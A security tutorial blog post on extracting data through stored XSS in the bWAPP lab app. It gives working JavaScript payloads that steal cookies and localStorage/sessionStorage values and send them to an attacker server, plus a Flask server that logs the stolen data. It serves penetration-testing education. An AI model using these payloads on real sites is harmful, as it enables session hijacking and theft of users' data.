---
layout: post
title:  "XSS Basics: Data extraction"
date:   2022-03-20 18:05:55 +0300
image:  XSSBasic/title.jpg
author-name: strik1r
tags:   [XSS, data extraction]
---

<h2>Prologue:</h2>
In this blog post series we will start to take a look at all the things we can do with xss. We will be discovering the impact an XSS vulnerability can have and this also increases your vulnerability report's value. This post will focus on data extraction.
<br>
<h3> Environment Setup </h3>
Throughout this series we will be using Bee WebAPP. The reason is that this application has so many vulnerabilities that can be used for testing. You can download and setup the VM from here: [Bee](https://www.vulnhub.com/entry/bwapp-bee-box-v16,53/)
Make sure your attacker machine and the Bee Webapp are on the same network segment.
<br>

<h2>The XSS</h2>
In our blogs we're not gonna focus on how to find XSS vulnerabilities or different XSS payloads. We will inject one simple XSS on the page that the victim would execute. The payload is intended to download a JavaScript file hosted on our attacker web server and execute it on the victim's browser.
<br>
```
<script src=http://serverIP/file.js></script>
```
![](/img/XSSBasic/inject.PNG)

We will inject this into the XSS - Stored (Blog) section.
We will also start a web server so our JavaScript files can be downloaded.
You may use any webserver you want. We will use basic python2's SimpleHTTPServer module to host our payloads.
<br>

```
python2 -m SimpleHTTPServer 80
```
<br>

<h2>Cookie Grabber</h2>
Well let's start with the basics, we can begin by grabbing victim's cookies. The simplest way for that is to exfiltrate the cookies via a HTTP GET request as a parameter. To grab the cookies we can start with the server we just set up.<br>
Injection:
```
<script src=http://127.0.0.1/cookie.js></script>
```
<br>
Contents of cookie.js:

```
var i=new Image;
i.src="http://127.0.0.1/?"+document.cookie;
```
<br>
![](/img/XSSBasic/firstSteal.PNG)

Looks like it worked! Now let's create a payload that will send the same cookies but this time in a HTTP POST request.
For this we will create and send an XMLHTTPRequest.
Injection:
```
<script src=http://127.0.0.1/postCookie.js></script>
```
<br>
postCookie.js:
```
var url = "http://127.0.0.1";
var body = document.cookie;
xr = new XMLHttpRequest();
xr.open("POST", url, true);
xr.send(body);
```
Understanding our payload line by line, on the very first line we are setting the URL where the data should be POSTed to. Then the body of that request would be the cookie we would like to steal.

On the third line we are creating the XMLHttpRequest object.
Then we need to specify the main parameters of the request. A POST request to the url and we are specifying it as asynchronous.
As the last step we are sending the request with the body as a parameter.


Upon sending the request, we are getting a response back. However, we cannot see the cookies as this basic server cannot handle HTTP POST requests yet. We will get back to this later.

<h2>Tampering cookies</h2>
In some scenarios as an attacker we might need to inject or modify existing cookies on a victim's browser. To execute such scenario we can use the following JS code.

Injection:
```
<script src=http://127.0.0.1/setCookie.js></script>
```
<br>
setCookie.js:
```
document.cookie = "username=user";
```
<br>
Before:
![](/img/XSSBasic/setCookieBefore.PNG)
<br>
After:
![](/img/XSSBasic/setCookieAfter.PNG)

<h2>Local Storage</h2>
We can clearly observe that this page does not use any Local Storage. We as an attacker can also set the same. The following payload creates an item and sets the value into it.

Injection:
```
<script src=http://127.0.0.1/setLocalStorageItem.js></script>
```
<br>
setLocalStorageItem.js>
```
window.localStorage.setItem('user', 'test');
```
<br>
![](/img/XSSBasic/setLocalStorage.PNG)

It worked, we set a local storage item. Now let's retrieve the value.
<br>
getLocalStorageItem.js:
```
var data = window.localStorage.getItem('user');
var i=new Image;
i.src="http://127.0.0.1/?"+data;
```
<br>
![](/img/XSSBasic/capturedLocalStorage.PNG)


Now we are able to set and get local storage items with JavaScript.

<h2>Session storage</h2>

Similar to local storage this page does not have anything set in the session storage so we need to set it:
```
<script src=http://127.0.0.1/setSessionStorageItem.js></script>
```
<br>
setSessionStorageItem:
```
sessionStorage.setItem('test', 'test');
```
<br>
Injection:
```
<script src=http://127.0.0.1/getSessionStorageItem.js></script>
```
<br>
getSessionStorageItem.js:
```
var data = window.sessionStorage.getItem('test');
var i=new Image;
i.src="http://127.0.0.1/?"+data;
```
<br>
![](/img/XSSBasic/capturedSessionStorage.PNG)

<h2>Setting up our data capture server</h2>
Now that we are able to exfiltrate data from victims and also are able to set storage items on the victim. Our next step would be to have a server setup to handle our incoming GET/POST requests. This helps us greatly while exfiltrating data as well!

For this we will use flask python API. For a quick start lets quickly check the quickstart guide: https://flask.palletsprojects.com/en/2.0.x/quickstart/
<br>
flaskServer.py:
```
from flask import Flask

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"
```
<br>
start the basic server with:
```
export FLASK_APP=flaskServer.py
flask run
```
<br>
It responds back with hello world so it definitely works. TIme to customize this server! First let's grab the incomming cookie from HTTP GET requests. For this we need to dig a little deeper in the quickstart page. Here we can find how to get data from requests. Further, we can also check how to write to a file: https://www.w3schools.com/python/python_file_write.asp
<br>

```
from flask import Flask
from flask import request

app = Flask(__name__)

@app.route("/saveGetCookie", methods=['GET'])
def saveGetCookie():
    cookie = request.args.get("a")
    f = open("savedCookies.txt", "a")
    f.write(cookie)
    f.close()
```
As show above we setup a small server. Let me explain what is happening here. We imported requests from flask so we can grab the incoming data.
Then we added a route named saveGetCookie and a method GET. This is so everything to our page /saveGetCookie will run the function below.
In the saveGetCookie function first line we will copy the argument's value a in the cookie variable. This means if a request looks like this "http://127.0.0.1:5000/saveGetCookie?a=thing" then the thing will go into the cookie variable.
Then we open a file called savedCookies and write the cookie inside it.
<br>
The new cookie.js we can inject would be like:
```
var i=new Image;
i.src="http://127.0.0.1:5000/saveGetCookie?a="+document.cookie;
```
<br>
![](/img/XSSBasic/savedCookie.PNG)

<h2>Upgrade the server</h2>
So now we have a basic server that works. We can save the contents of the HTTP GET requests into a file and then extract some data. At the beginning of the module we created a cookie stealer that sends a post request. We should upgrade our server to save that too.
<br>

```
from flask import Flask
from flask import request

app = Flask(__name__)

@app.route("/saveCookie", methods=['POST', 'GET'])
def saveGetCookie():
    cookie = ""
    if request.method == 'GET':
        cookie = request.args.get("a")
    else:
        print(request.form["a"])
        cookie = request.form["a"]
    f = open("savedCookies.txt", "a")
    f.write(cookie)
    f.write("\n")
    f.close()
```
So what happened here? The endpoint name changed, because it is not just GET request that gets saved from now on. Then we added POST to the parameters too. Then we check if the incoming request is GET, if yes, we proceed as we did. If the request is POST, we will use the form value of the request. That is a multidict and from that we grab the parameter 'a'. So the incoming post request body will look like something along the line:
<br>
```
a=cookiesandvalues
```
<br>
We will be retrieving cookies and values and put it in the variable cookie. After that no matter where the request came from, we save the result in the file. Then we add a new line character just to keep things a little more clear.
We also had to upgrade the cookiePost.js script. We added the parameter in the body, we set the content type to application/x-www-form-urlencoded so that the request.form can parse it without issue. This can be achieved by using the setRequestHeader() function.
<br>
The final result is as seen below.
cookiePost.js
<br>
```
var url = "http://127.0.0.1:5000/saveCookie";
var body = "a=" + document.cookie;
xr = new XMLHttpRequest();
xr.open("POST", url, true);
xr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
xr.send(body);
```
<br>
The content type that best fits our request here is application/x-www-form-urlencoded. Flask can parse the request really easily with the use of .form. We are almost done. We only have problems if cookies contain some special characters. These characters are { , } , \| , \ , ^ , ~ , [ , ] , and ` . All unsafe characters must always be encoded within a URL. Luckily we have a simple JavaScript function to help with this. With the help of encodeURIComponent(), we can encode the parameters before sending them like this:
<br>

```
var body = "a=" + encodeURIComponent(document.cookie);
```
<br>
<h2> End: </h2>
So now we have a few scripts for extracting different data and a web server that saves the incoming data. After a small refactor and preparing the web server for receiving and saving multiple different data we end up with a server something like this:

```
from flask import Flask
from flask import request

app = Flask(__name__)

@app.route("/saveCookie", methods=['POST', 'GET'])
def saveCookie():
    cookie = ""
    if request.method == 'GET':
        cookie = request.args.get("a")
    else:
        cookie = request.form["a"]
    f = open("savedCookies.txt", "a")
    f.write(cookie)
    f.write("\n")
    f.close()
    return ""

@app.route("/saveLocalStorage", methods=['POST', 'GET'])
def saveLocalStorage():
    localStorage = ""
    if request.method == 'GET':
        localStorage = request.args.get("a")
    else:
        localStorage = request.form["a"]
    f = open("savedLocalStorage.txt", "a")
    f.write(localStorage)
    f.write("\n")
    f.close()
    return ""

@app.route("/saveSessionStorage", methods=['POST', 'GET'])
def saveSessionStorage():
    sessionStorage = ""
    if request.method == 'GET':
        sessionStorage = request.args.get("a")
    else:
        sessionStorage = request.form["a"]
    f = open("savedSessionStorage.txt", "a")
    f.write(sessionStorage)
    f.write("\n")
    f.close()
    return ""
```
<br>
For this we can do a single XSS script that will extract all this data for us.
<br>

```
var server = "http://127.0.0.1:5000/";
var cookieBody = "a=" + encodeURIComponent(document.cookie);
cookieUrl = server + "/saveCookie"
xr = new XMLHttpRequest();
xr.open("POST", cookieUrl, true);
xr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
xr.send(cookieBody);

sessionStorageItem = window.sessionStorage.getItem('some')
var sessionBody = "a=" + encodeURIComponent(sessionStorageItem);
xr = new XMLHttpRequest();
sessionUrl = server + "/saveSessionStorage"
xr.open("POST", sessionUrl, true);
xr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
xr.send(sessionBody);

localStorageItem = window.localStorage.getItem('user');
xr = new XMLHttpRequest();
sessionUrl = server + "/saveLocalStorage"
var localStorageBody = "a=" + encodeURIComponent(localStorageItem);
xr.open("POST", sessionUrl, true);
xr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
xr.send(localStorageBody);
```
<br>
We can see that our files are created and all the data are saved.

We will end our 1st part of this series here. We learnt about creating a web server to capture our incoming exfiltrated data and also created few payloads to set and get certain browser related storage. In the next parts of the series we shall be reviewing more XSS attack vectors. Also, next time we will be exploiting different vulnerabilities using XSS.
